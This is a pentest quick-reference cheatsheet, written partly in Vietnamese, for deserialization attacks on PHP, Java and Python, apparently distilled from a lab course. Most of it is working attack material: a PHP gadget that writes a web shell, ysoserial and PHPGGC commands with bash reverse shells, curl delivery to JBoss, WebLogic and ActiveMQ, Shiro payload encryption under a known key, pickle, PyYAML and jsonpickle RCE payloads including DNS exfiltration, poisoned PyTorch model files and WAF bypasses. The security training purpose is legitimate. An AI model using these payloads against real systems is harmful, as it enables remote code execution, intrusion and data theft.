---
title: "A0. Quick Reference — Deserialization Attacks Across PHP · Java · Python"
type: reference
tags: [pentest, deserialization, reference, cheatsheet]
aliases: [Deserialization Quick Reference]
created: 2026-04-06
---

> Aggregated command reference từ tất cả 22 lessons. Dùng khi đã quen với concepts — không thay thế lessons.

---

## Magic Byte Signatures

| Language | Raw Bytes | Base64 Prefix | Text Pattern |
|----------|-----------|---------------|--------------|
| Java | `AC ED 00 05` | `rO0AB` | — |
| Java (gzip) | `1F 8B` | `H4sI` | — |
| PHP unserialize | — | — | `O:N:"ClassName":N:{` |
| PHP array | — | — | `a:N:{i:0;s:N:"..."}` |
| Python pickle P4 | `80 04` | `gASV` | — |
| Python pickle P2 | `80 02` | `gAJw` | — |
| .NET BinaryFormatter | `00 01 00 00` | `AAEAAA` | — |
| Ruby Marshal | `04 08` | `BAg=` | — |
| Flask session | — | `eyJ` | 3 parts separated by `.` |

---

## Quick Detection

```bash
# Decode và check bytes
echo "BASE64_BLOB" | base64 -d | xxd | head -2

# Java stream parse
java -jar SerializationDumper.jar -b HEXSTREAM

# Python pickle disassemble
python3 -c "import pickletools,base64,sys; pickletools.dis(base64.b64decode('PAYLOAD'))"

# PHP unserialize parse
php -r "var_dump(unserialize('O:4:...'));"

# Flask decode
flask-unsign --decode --cookie "SESSION_COOKIE"
```

---

## PHP Attack Cheatsheet

### Detection

```bash
# Find unserialize() calls
grep -rn "unserialize(" /var/www/html/ | grep -v ".bak"
grep -rn "phar://" /var/www/html/

# Tìm magic methods
grep -rn "function __wakeup\|function __destruct\|function __toString" /var/www/html/
```

### POP Chain Build (Manual)

```php
<?php
// Stub: build chain object and serialize
class Logger {
    public $logfile = "/var/www/html/shell.php";
    public $content = "<?php system(\$_GET['c']); ?>";
}
echo base64_encode(serialize(new Logger()));
?>
```

### PHPGGC

```bash
# List chains
phpggc --list

# Generate payload
phpggc Laravel/RCE1 system "id"
phpggc Symfony/RCE7 exec "bash -c 'bash -i >& /dev/tcp/LHOST/PORT 0>&1'"

# Base64 encode
phpggc Laravel/RCE1 system "id" -b

# PHAR
phpggc Laravel/RCE1 system "id" -p phar -o exploit.phar
```

### PHAR Trigger

```bash
# Craft PHAR with gadget chain in metadata
php -r "
\$phar = new Phar('exploit.phar');
\$phar->startBuffering();
\$phar->setMetadata(\$gadget_object);
\$phar->addFromString('x', 'x');
\$phar->stopBuffering();
"
# Disguise: cat jpeg_header exploit.phar > evil.jpg
# Trigger: file_exists('phar:///uploads/evil.jpg')
```

---

## Java Attack Cheatsheet

### Detect

```bash
# Magic bytes in HTTP traffic
echo "COOKIE_VALUE" | base64 -d | xxd | head -1
# aced 0005 = Java, 1f8b = gzipped Java

# Nmap port scan for Java services
nmap -sV -p 1099,7001,7002,8080,8686,50000,61616 TARGET
```

### ysoserial Payloads

```bash
# URLDNS (no library needed — detection only)
java -jar ysoserial.jar URLDNS "http://collab.oastify.com"

# Sleep confirm
java -jar ysoserial.jar CommonsCollections6 "sleep 5"

# Reverse shell
java -jar ysoserial.jar CommonsCollections6 \
  "bash -c 'bash -i >& /dev/tcp/LHOST/PORT 0>&1'"

# JDK 16+ flags required
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens=java.base/java.net=ALL-UNNAMED \
     --add-opens=java.base/java.util=ALL-UNNAMED \
     -jar ysoserial-all.jar GADGET "cmd"

# Gadget chain priority
# CC6 → CommonsBeanutils1 → Spring1 → ROME → Groovy1 → JRMPClient
```

### Delivery Methods

```bash
# HTTP POST (generic)
curl TARGET -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser

# Base64 cookie
curl TARGET -H "Cookie: session=$(base64 -w0 payload.ser)"

# JBoss JMXInvokerServlet
curl http://TARGET:8080/invoker/JMXInvokerServlet \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser

# WLT3Serial (WebLogic T3)
java -jar WLT3Serial.jar TARGET 7001 payload.ser

# JMET (ActiveMQ JMS)
java -jar jmet.jar -Q q -I ActiveMQ -Y CommonsCollections6 TARGET 61616 \
  -- "bash -c '...'"
```

### Apache Shiro

```bash
# Detect: rememberMe=deleteMe in Set-Cookie
curl -si http://TARGET/login -d "u=x&p=x" | grep rememberMe

# Brute AES key
python3 shiro_scan.py -u http://TARGET/

# Encrypt payload with known key
python3 -c "
import base64, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
payload = open('payload.ser','rb').read()
iv = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv)
print(base64.b64encode(iv + cipher.encrypt(pad(payload, 16))).decode())
"
```

### WebLogic T3

```bash
# Banner grab
echo -e "t3 12.2.1\nAS:255\nHL:19\n\n" | nc TARGET 7001 | strings | grep HELO

# CVE-2018-2628 two-stage
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 CC1 "bash -c '...'" &
java -jar ysoserial.jar JRMPClient "LHOST:1234" > jrmp.ser
java -jar WLT3Serial.jar TARGET 7001 jrmp.ser
```

### RMI / JMX

```bash
# Enum
java -jar BaRMIe_v1.01.jar -enum TARGET 1099
java -jar rmg.jar scan TARGET 1099

# Exploit
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit TARGET 1099 CC6 "cmd"
```

---

## Python Attack Cheatsheet

### Pickle Payload Generation

```python
import pickle, os, base64

# Minimal RCE
class R:
    def __reduce__(self): return (os.system, ("COMMAND",))

# Base64 encoded (for HTTP delivery)
payload = base64.b64encode(pickle.dumps(R())).decode()

# URL-safe base64 (for Flask cookies)
payload = base64.urlsafe_b64encode(pickle.dumps(R())).decode()

# Common commands:
# id                          → confirm RCE
# sleep 5                     → timing confirm
# bash -c 'bash -i >& /dev/tcp/LHOST/PORT 0>&1'  → reverse shell
# nslookup $(id).collab       → DNS exfil
# touch /tmp/pwn_$(date +%s)  → blind write confirm
```

### PyYAML

```yaml
# Payload (deliver as YAML content)
!!python/object/apply:os.system
- "bash -c 'bash -i >& /dev/tcp/LHOST/PORT 0>&1'"

# Alternative
!!python/object/apply:subprocess.check_output
- [id]
```

### jsonpickle

```python
import json

payload = json.dumps({
    "py/reduce": [
        {"py/function": "os.system"},
        {"py/tuple": ["bash -c 'bash -i >& /dev/tcp/LHOST/PORT 0>&1'"]}
    ]
})
```

### Flask Session

```bash
# Decode
flask-unsign --decode --cookie "SESSION_VALUE"

# Brute-force key
flask-unsign --unsign --cookie "SESSION_VALUE" --wordlist rockyou.txt --threads 8

# Forge
flask-unsign --sign --secret "SECRET_KEY" --cookie "{'admin': True, 'username': 'admin'}"
```

### ML Frameworks

```python
import torch, os
class R:
    def __reduce__(self): return (os.system, ("id",))
torch.save({"model": R()}, "malicious.pt")
# Victim: torch.load("malicious.pt") → RCE

import joblib
joblib.dump(R(), "malicious.pkl")
# Victim: joblib.load("malicious.pkl") → RCE
```

---

## WAF Bypass

```bash
# GZip
gzip -c payload.ser | curl TARGET \
  -H "Content-Encoding: gzip" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @-

# Alternative gadget when CC blocked
java -jar ysoserial.jar CommonsBeanutils1 "cmd"   # no CC dependency
java -jar ysoserial.jar Spring1 "cmd"              # spring-core
java -jar ysoserial.jar ROME "cmd"                 # RSS library

# GadgetProbe — enumerate classpath
java -jar GadgetProbe.jar --url http://TARGET/ep --dns collab.oastify.com
```

---

## Lab Recommendations Quick Reference

| Technique | HTB Machine | PortSwigger Lab |
|-----------|------------|-----------------|
| Java CC chain | Arkham | Exploiting Java deser with Apache Commons |
| Shiro | Arkham | — |
| WebLogic T3 | — | — (custom lab) |
| PHP POP chain | Tenet | Arbitrary object injection in PHP |
| PHAR | Tenet | PHAR deserialization |
| Python pickle | Canape | Python deserialization labs |
| Flask session | — | Manipulating serialized data types |
| Jenkins CLI | Jeeves | — |
| Custom gadget | — | Custom gadget chain for Java |

---

## Tools Quick Reference

| Tool | Install | Primary Use |
|------|---------|-------------|
| ysoserial | `wget ysoserial-all.jar` | Java gadget chain generator |
| PHPGGC | `git clone phpggc` | PHP gadget chain generator |
| flask-unsign | `pip3 install flask-unsign` | Flask session decode/forge/brute |
| BaRMIe | `wget BaRMIe.jar` | Java RMI enumeration |
| remote-method-guesser | `wget rmg.jar` | Java RMI advanced enum |
| WLT3Serial | `git clone WLT3Serial` | WebLogic T3 payload delivery |
| JMET | `wget jmet-0.1.0-all.jar` | JMS broker exploitation |
| SerializationDumper | `git clone SerializationDumper` | Java stream parser |
| Freddy | Burp BApp Store | Auto-detect deser in Burp |
| GadgetProbe | `git clone GadgetProbe` | Java classpath enumeration |
| ShiroScan | `git clone ShiroScan` | Shiro AES key brute-force |
